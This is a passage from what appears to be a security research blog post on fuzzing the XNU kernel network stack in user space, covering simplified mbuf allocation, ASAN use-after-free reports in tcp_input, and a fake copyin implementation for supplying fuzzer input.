class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;zone&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; free&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;dat&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Kalloc, kfree, and related functions were passed through to malloc and free as well. You can see fuzz/zalloc.c for their implementations. Mbufs (memory buffers) are more work to implement because they contain considerable metadata that is exposed to the &amp;ldquo;client&amp;rdquo; networking code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3cadcc6e539811e51cc5416c071def6b93755bc1"&gt;&lt;/a&gt;&lt;a id="t.17"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;m_hdr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mbuf &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;mh_next&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;/* next buffer in chain */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mbuf &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;mh_nextpkt&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* next chain in queue/record */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; caddr_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mh_data&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* location of data */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; int32_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mh_len&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;/* amount of data in this mbuf */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u_int16_t &amp;nbsp; &amp;nbsp; &amp;nbsp; mh_type&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* type of data in this mbuf */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; u_int16_t &amp;nbsp; &amp;nbsp; &amp;nbsp; mh_flags&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;/* flags; see below */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;&amp;nbsp;* The mbuf object&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mbuf &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;m_hdr m_hdr&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;union&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;pkthdr MH_pkthdr&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* M_PKTHDR set */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;union&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;m_ext MH_ext&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c17"&gt;/* M_EXT set */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;MH_databuf&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c0"&gt;_MHLEN&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;MH_dat&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;MH&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;char&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;M_databuf&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c0"&gt;_MLEN&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;/* !M_PKTHDR, !M_EXT */&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;M_dat&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;I didn&amp;rsquo;t include the &lt;/span&gt;&lt;span class="c9"&gt;pkthdr&lt;/span&gt;&lt;span&gt;&amp;nbsp;nor &lt;/span&gt;&lt;span class="c9"&gt;m_ext&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure definitions, but they are nontrivial (you can see for yourself in bsd/sys/mbuf.h). A lot of trial and error was needed to create a simplified mbuf format that would work. In practice, I use an inline buffer when possible and, when necessary, locate the data in one large external buffer and set the &lt;/span&gt;&lt;span class="c9"&gt;M_EXT&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag. As these allocations must be aligned, I use &lt;/span&gt;&lt;span class="c9"&gt;posix_memalign&lt;/span&gt;&lt;span&gt;&amp;nbsp;to create them, rather than &lt;/span&gt;&lt;span class="c9"&gt;malloc&lt;/span&gt;&lt;span class="c8 c2"&gt;. Fortunately ASAN can help manage these allocations, so we can detect some bugs with this modification.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Two bugs I reported via the &lt;/span&gt;&lt;span&gt;Project Z&lt;/span&gt;&lt;span&gt;ero tracker highlight the benefit of the heap-based mbuf implementation&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1981"&gt;first report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, I detected an mbuf double free using ASAN. While the &lt;/span&gt;&lt;span class="c9"&gt;m_free&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation tries to detect double frees by checking the state of the allocation, ASAN goes even further by quarantining recently freed allocations to detect the bug. In this case, it looks like the fuzzer would have found the bug either way, but it was impressive. The &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1976"&gt;second issue&lt;/a&gt;&lt;/span&gt;&lt;span class="c2 c8"&gt;&amp;nbsp;linked is much subtler and requires some instrumentation to detect the bug, as it is a use after free read of an mbuf:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a88ece0e2c57e078b87f3bf379cfbeb8837c55ed"&gt;&lt;/a&gt;&lt;a id="t.18"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;22568&lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c0"&gt;ERROR&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;AddressSanitizer&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;heap&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;use&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;after&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c0"&gt;free on address &lt;/span&gt;&lt;span class="c3"&gt;0x61500026afe5&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;at pc &lt;/span&gt;&lt;span class="c3"&gt;0x7ff60f95cace&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;bp &lt;/span&gt;&lt;span class="c3"&gt;0x7ffd4d5617b0&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;sp &lt;/span&gt;&lt;span class="c3"&gt;0x7ffd4d5617a8&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;READ of size &lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;at &lt;/span&gt;&lt;span class="c3"&gt;0x61500026afe5&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;thread T0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x7ff60f95cacd in tcp_input bsd/netinet/tcp_input.c:5029:25&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7ff60f949321 in tcp6_input bsd/netinet/tcp_input.c:1062:2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7ff60fa9263c in ip6_input bsd/netinet6/ip6_input.c:1277:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c3"&gt;0x61500026afe5&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;is&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;located &lt;/span&gt;&lt;span class="c3"&gt;229&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;bytes inside of &lt;/span&gt;&lt;span class="c3"&gt;256&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;byte&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;region &lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c3"&gt;0x61500026af00&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c3"&gt;0x61500026b000&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;freed &lt;/span&gt;&lt;span class="c6"&gt;by&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;thread T0 here&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#0 0x4a158d in free /b/swarming/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:123:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#1 0x7ff60fb7444d in m_free fuzz/zalloc.c:220:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#2 0x7ff60f4e3527 in m_freem bsd/kern/uipc_mbuf.c:4842:7&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#3 0x7ff60f5334c9 in sbappendstream_rcvdemux bsd/kern/uipc_socket2.c:1472:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#4 0x7ff60f95821d in tcp_input bsd/netinet/tcp_input.c:5019:8&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#5 0x7ff60f949321 in tcp6_input bsd/netinet/tcp_input.c:1062:2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7ff60fa9263c in ip6_input bsd/netinet6/ip6_input.c:1277:10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;Apple managed to catch this issue before I reported it, fixing it in iOS 13. I believe Apple has added some internal hardening or testing for mbufs that caught this bug. It could be anything from a hardened mbuf allocator like &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://llvm.org/docs/GwpAsan.html"&gt;GWP-ASAN&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;, to an internal ARM MTE test, to simple auditing, but it was really cool to see this issue detected in this way, and also that Apple was proactive enough to find this themselves.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c20 c18" id="h.d95bqayxtdtc"&gt;&lt;span class="c2 c27"&gt;Accessing User Memory&lt;/span&gt;&lt;/h1&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;When talking about this project with a fellow attendee at a fuzzing conference, their biggest question was how I handled user memory access. Kernels are never supposed to trust pointers provided by user-space, so whenever the kernel wants to access memory-mapped in userspace, it goes through intermediate functions &lt;/span&gt;&lt;span class="c9"&gt;copyin&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c9"&gt;copyout&lt;/span&gt;&lt;span class="c8 c2"&gt;. By replacing these functions with our fake implementations, we can supply fuzzer-provided input to the tested code. The real kernel would have done the relevant copies from user to kernel pages. Because these copies are driven by the target code and not our testcase, I added a buffer in the protobuf specification to be used to service these requests.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Here&amp;rsquo;s a backtrace from our stub before we implement `copyin`&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As you can see, when calling the `recvfrom` syscall, our fuzzer passed in a pointer as an argument.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.95cfad74e7fc7217ee4a1ac5e48dea5ca2a33f6a"&gt;&lt;/a&gt;&lt;a id="t.19"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#6 0x7fe1176952f3 in Assert /source/build3/../fuzz/stubs.c:21:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#7 0x7fe11769a110 in copyin /source/build3/../fuzz/fake_impls.c:408:3&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#8 0x7fe116951a18 in __copyin_chk /source/build3/../bsd/libkern/copyio.h:47:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#9 0x7fe116951a18 in recvfrom_nocancel /source/build3/../bsd/kern/uipc_syscalls.c:2056:11&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#10 0x7fe117691a86 in recvfrom_nocancel_wrapper /source/build3/../fuzz/syscall_wrappers.c:244:10&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#11 0x4e933a in TestOneProtoInput(Session const&amp;amp;) /source/build3/../fuzz/net_fuzzer.cc:936:9&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;#12 0x4e43b8 in LLVMFuzzerTestOneInput /source/build3/../fuzz/net_fuzzer.cc:631:1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;I&amp;rsquo;ve extended the copyin specification with my fuzzer-specific semantics: when the pointer &lt;/span&gt;&lt;span class="c9"&gt;(void*)1&lt;/span&gt;&lt;span&gt;&amp;nbsp;is passed as an address, we interpret this as a request to fetch arbitrary bytes. Otherwise, we copy directly from that virtual memory address. This way, we can begin by passing &lt;/span&gt;&lt;span class="c9"&gt;(void*)1&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;everywhere in the fuzz target to get as much cheap coverage as possible. Later, as we want to construct well-formed data to pass into syscalls, we build the data in the protobuf test case handler and pass a real pointer to it, allowing it to be copied. This flexibility saves us time while permitting the construction of highly-structured data inputs as we see fit.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e72a3ef67035e7b412dce9ccdc54b3659668a297"&gt;&lt;/a&gt;&lt;a id="t.20"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;__attribute__&lt;/span&gt;&lt;span class="c1"&gt;((&lt;/span&gt;&lt;span class="c0"&gt;warn_unused_result&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;copyin&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;user_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;kernel_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;size_t nbytes&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// Address 1 means use fuzzed bytes, otherwise use real bytes.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// NOTE: this does not support nested useraddr.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;user_addr &lt;/span&gt;&lt;span class="c1"&gt;!=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;*)&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;kernel_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;user_addr&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;nbytes&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;get_fuzzed_bool&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; 